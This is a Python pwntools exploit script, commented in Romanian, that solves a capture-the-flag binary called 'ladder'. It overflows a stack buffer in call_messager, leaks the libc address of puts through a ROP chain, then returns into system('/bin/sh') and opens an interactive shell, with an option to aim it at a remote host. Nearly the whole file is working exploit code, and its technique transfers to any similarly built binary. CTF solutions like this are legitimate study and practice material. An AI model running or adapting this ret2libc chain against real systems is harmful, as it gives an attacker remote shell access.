#!/usr/bin/env python3
# ============================================================================
# CTF: ladder — ret2libc (stack BOF: leak libc + system)
# Vulnerabilitate: main cheama intai mull(5) (fgets 0x10, deci ii dam o linie), apoi
#   overflow in call_messager (offset 136) peste return address. Stage 1: fabricam
#   puts(puts@got) => leak puts din libc => baza libc, re-entry in call_messager.
#   Stage 2: ret in system("/bin/sh").
# Binar: ELF 64-bit (amd64), not stripped | NX on · fara canary · No-PIE · Partial RELRO
#   - Fara canary => overflow direct. No-PIE => gadget pop_rdi 0x004011bc si plt/got
#     fixe. NX on => ret2libc (fara shellcode). 'ret' in plus pt aliniere la 16 (movaps).
# ============================================================================
import sys
from pwn import *

context.binary = elf = ELF('./ladder')
context.log_level = 'info'

if len(sys.argv) >= 3 and sys.argv[2].isdigit():
    p, libc = remote(sys.argv[1], sys.argv[2]), ELF('./libc.so')
else:
    p, libc = process('./ladder'), elf.libc

# gadget-uri (le tin ca int, le impachetez cu p64 la folosire)
pop_rdi = 0x004011bc    # pop rdi; ret
ret     = 0x004011bd    # ret  (doar pt aliniere stiva la 16)

OFF = 136               # offset pana la return address in call_messager (sub rsp,0x88, fara push rbp)

# main cheama intai mull(5): mull face fgets(buf, 0x10) -> trebuie sa-i dam o linie
p.recvuntil(b"please set a message")
p.sendline(b"junk")

# ============ STAGE 1: leak libc ============
# Fabricam noi apelul puts(puts@got). puts@plt tipareste adresa REALA a lui
# puts din libc (din GOT). NU ne trebuie niciun printf/puts vulnerabil: overflow-ul
# ne lasa sa chemam orice functie cu orice argument.
p.recvuntil(b"Time to say something:")
payload  = b'A' * OFF
payload += p64(pop_rdi)
payload += p64(elf.got['puts'])          # rdi = adresa din GOT a lui puts
payload += p64(elf.plt['puts'])          # apelam puts@plt(puts@got)
payload += p64(elf.symbols['call_messager'])  # ne intoarcem aici pt stage 2
p.sendline(payload)

# call_messager tipareste "Message sent" inainte sa dea return in ROP-ul nostru,
# apoi puts-ul nostru scuipa cei 6 octeti ai adresei libc + newline
p.recvuntil(b"Message sent\n")
leak = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = leak - libc.symbols['puts']       # baza libc
log.success(f"puts leak : {leak:#x}")
log.success(f"libc base : {libc.address:#x}")

# ============ STAGE 2: system("/bin/sh") ============
# al doilea overflow (call_messager ruleaza din nou)
p.recvuntil(b"Time to say something:")
payload  = b'A' * OFF
payload += p64(ret)                               # aliniere 16 (altfel movaps in system crapa)
payload += p64(pop_rdi)
payload += p64(next(libc.search(b"/bin/sh\x00"))) # rdi = "/bin/sh"
payload += p64(libc.symbols['system'])            # system("/bin/sh")
p.sendline(payload)

p.interactive()   # shell -> cat flag.txt
